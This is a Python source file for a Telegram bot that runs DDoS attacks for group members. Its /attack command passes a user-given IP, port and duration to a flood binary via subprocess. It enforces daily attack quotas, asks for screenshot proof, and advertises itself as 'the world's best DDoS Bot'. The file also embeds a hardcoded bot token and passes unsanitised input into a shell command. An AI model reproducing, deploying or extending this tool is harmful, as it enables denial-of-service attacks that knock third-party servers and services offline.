#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading

# Insert your Telegram bot token here
bot = telebot.TeleBot('7462970141:AAEKa7CI39Zvkpo7Ev-AgYc7TRNeYV0EhZI')

# Admin user IDs
admin_id = ["7357694692"]

# Group and channel details
GROUP_ID = "-1002286236671"
CHANNEL_USERNAME = "@LOSTVIPDDOS76"

# Default cooldown and attack limits
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 10  # Maximum attacks per day
pending_feedback = {}  # Tracks users needing to submit screenshots

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user attack data
user_data = {}

# 🎯 Random Image URLs
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    """
    Check if a user is a member of the required Telegram channel.
    """
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False


def load_users():
    """
    Load user data from the file.
    """
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass


def save_users():
    """
    Save user data to the file.
    """
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")


@bot.message_handler(commands=['attack'])
def handle_attack(message):
    """
    Handles the attack command from users.
    """
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    # Ensure command is executed in the group
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 This bot only works in the official group!\n🔗 Join now: {CHANNEL_USERNAME}")
        return

    # Check if user is in the required channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ You must join {CHANNEL_USERNAME} first!")
        return

    # Ensure previous attack feedback is submitted
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 Submit your previous attack screenshot before starting a new one!")
        return

    # Ensure the command format is correct
    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, duration = command[1], command[2], command[3]

    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "❌ Error: Port and Time must be numbers!")
        return

    if duration > 180:
        bot.reply_to(message, "🚫 Maximum attack duration is 180 seconds!")
        return

    # Check and update user attack limits
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ Attack limit reached for today!")
        return

    # Select a random confirmation image
    random_image = random.choice(image_urls)

    # Inform the user and request a screenshot
    bot.send_photo(message.chat.id, random_image, caption=f"💥 Attack Started!\n"
                                                          f"🎯 Target: `{target}:{port}`\n"
                                                          f"⏳ Duration: {duration}s\n"
                                                          f"⚡ Remaining Attacks: {ATTACK_LIMIT - user['attacks'] - 1}\n"
                                                          f"📸 Send a screenshot as proof!")

    # Mark feedback as pending
    pending_feedback[user_id] = True

    # Execute attack command
    attack_command = f"./LOSTPAPA {target} {port} {duration} 1200"
    try:
        subprocess.run(attack_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error: {e}")
        pending_feedback[user_id] = False
        return

    bot.send_message(message.chat.id, "✅ Attack completed successfully!")
    user_data[user_id]['attacks'] += 1
    save_users()


@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    """
    Handles screenshots sent as feedback.
    """
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name

    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False

        # Forward screenshot to the channel
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        bot.send_message(CHANNEL_USERNAME, f"📸 Feedback received from `{user_name}` ({user_id})")
        bot.reply_to(message, "✅ Screenshot received! You can now launch another attack.")
    else:
        bot.reply_to(message, "❌ This is not a valid response!")


@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    """
    Check the remaining attack limit for a user.
    """
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining today.")


@bot.message_handler(commands=['reset'])
def reset_user(message):
    """
    Allows an admin to reset a user's attack limit.
    """
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"User {user_id}'s attack limit has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    """
    Welcomes new users.
    """
    user_name = message.from_user.first_name
    response = f"""🌟🔥 Welcome {user_name}! 🔥🌟
    
🚀 **You're in the home of POWER!**  
💥 The world's best **DDoS Bot** is here!  

🔗 **To use this bot, join our official channel:**  
👉 [Telegram Group](https://t.me/+xsi7410YP0c3ZTc1) 🚀🔥"""

    bot.reply_to(message, response, parse_mode="Markdown")


def auto_reset():
    """
    Resets daily attack limits automatically at midnight.
    """
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()


# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)